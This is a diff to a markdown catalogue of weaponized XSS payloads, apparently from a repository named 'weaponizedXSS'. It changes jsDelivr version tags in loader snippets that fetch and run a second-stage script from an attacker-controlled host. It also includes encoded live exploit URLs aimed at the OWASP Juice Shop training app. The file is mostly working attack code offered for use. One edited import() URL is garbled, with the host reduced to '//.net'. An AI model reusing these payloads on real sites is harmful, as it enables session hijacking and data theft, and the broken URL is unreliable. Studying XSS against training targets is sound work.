@@ -17,8 +17,8 @@ In case the second stage payload is hosted on GitHub (`Content-Type: text/plain`
 * https://cdn.jsdelivr.net/gh/GITHUB_USERNAME/GITHUB_PROJECT_NAME@VERSION/GITHUB_PROJECT_PATH/GITHUB_JS_FILE
     * e.g.
         * original: https://raw.githubusercontent.com/lighthouseitsecurity/weaponizedXSS/refs/heads/main/basic/simplePoC/simpleStd.js
-        * proxied: https://cdn.jsdelivr.net/gh/lighthouseitsecurity/weaponizedXSS@main/basic/simplePoC/simpleStd.js
-    * **NOTE**: to avoid errors with jsdelivr (`Failed to fetch version info for ...`), [use `@main` as version of GitHub repository](https://github.com/jsdelivr/jsdelivr/issues/18327#issuecomment-923013355)
+        * proxied: https://cdn.jsdelivr.net/gh/lighthouseitsecurity/weaponizedXSS@latest/basic/simplePoC/simpleStd.js
+    * **NOTE**: to avoid errors with jsdelivr (`Failed to fetch version info for ...`), use `@latest` as version of GitHub repository
 
 ## `import()` - round brackets; quote; `Access-Control-Allow-Origin` required
 
@@ -28,7 +28,7 @@ import('//ATTACKER_WS/PATH/JS_PAYLOAD');
 
 * *(live example - OWASP Juice Shop - DOM XSS)*
 
-    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22import(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40main%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22import(%27%2F%2F.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40main%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
 
 ## [jQuery] `$.getScript()` - round brackets; quote; dollar
 
@@ -38,7 +38,7 @@ $.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
 
 * *(live example - OWASP Juice Shop - DOM XSS)*
 
-    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22%24.getScript(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40main%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22%24.getScript(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40latest%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
 
     * **NOTE**: it seems that, in the meantime, OWASP Juice Shop stopped using jQuery, so the live example link will NOT work
 
@@ -50,7 +50,7 @@ jQuery.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
 
 * *(live example - OWASP Juice Shop - DOM XSS)*
 
-    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22jQuery.getScript(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40main%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22jQuery.getScript(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40latest%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
 
     * **NOTE**: it seems that, in the meantime, OWASP Juice Shop stopped using jQuery, so the live example link will NOT work
 
@@ -62,7 +62,7 @@ with(document)body.appendChild(createElement('script')).src='//ATTACKER_WS/PATH/
 
 * *(live example - OWASP Juice Shop - DOM XSS)*
 
-    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement(%27script%27)).src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40main%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3B%22%3E
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement(%27script%27)).src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40latest%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3B%22%3E
 
 ## `appendChild()` #2 - round brackets; quote; equal; space
 
@@ -72,7 +72,7 @@ var js=document.createElement('script');js.type='text/javascript';js.src='//ATTA
 
 * *(live example - OWASP Juice Shop - DOM XSS)*
 
-    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22var%20js%3Ddocument.createElement(%27script%27)%3Bjs.type%3D%27text/javascript%27%3Bjs.src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40main%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3Bdocument.body.appendChild(js)%3B%22%3E
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22var%20js%3Ddocument.createElement(%27script%27)%3Bjs.type%3D%27text/javascript%27%3Bjs.src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40latest%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3Bdocument.body.appendChild(js)%3B%22%3E
 
 ## `fetch()` #1 - round brackets; right angle bracket; quote; equal; `eval()`; `Access-Control-Allow-Origin` required; works with `Content-Type: text/plain`
 
